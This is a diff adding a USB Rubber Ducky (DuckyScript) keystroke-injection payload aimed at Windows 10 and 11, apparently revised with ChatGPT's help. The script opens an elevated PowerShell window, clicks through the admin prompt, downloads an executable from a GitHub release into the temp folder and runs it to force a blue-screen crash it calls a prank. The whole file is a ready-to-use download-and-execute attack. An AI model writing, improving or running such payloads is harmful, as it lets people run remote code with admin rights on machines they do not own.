@@ -1,0 +1,31 @@
+REM Title: Mario-Head BSOD (Improved)
+REM Author: FalsePhilosopher (Revised by ChatGPT)
+REM Target: Windows 10 and 11
+REM Props: Hak5, bemxio, 3ct0s
+REM Version: 1.1
+REM Description: Downloads and runs the Mario-Head BSOD prank reliably
+
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+
+REM Open in new admin window and run commands
+STRING $url = 'https://github.com/bemxio/mario-head/releases/latest/download/mario_head.exe';
+ENTER
+DELAY 400
+STRING $file = "$env:TEMP\mario_head.exe";
+ENTER
+DELAY 400
+STRING Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing;
+ENTER
+DELAY 800
+STRING Start-Process $file;
+ENTER
+DELAY 300
+STRING exit
+ENTER
